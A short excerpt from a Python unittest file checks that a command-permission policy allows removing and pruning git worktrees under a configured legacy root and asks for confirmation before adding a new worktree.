    def test_configured_legacy_worktree_remove_and_prune(self):
        legacy = self.base / 'DotCortex-wt'
        legacy.mkdir()
        self.manifest['coordinator_ops']['worktree_roots'].append(str(legacy))
        self.manifest['roots'].append(str(legacy))
        path = legacy / 'worker'
        self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
        self.allow(f'git worktree remove {path}')
        self.allow('git worktree prune')
        # New additions retain the requested <repo>-wt-* root shape.
        self.ask(f'git worktree add {legacy}/new-worker -b new-worker master')



if __name__ == '__main__':
    unittest.main()
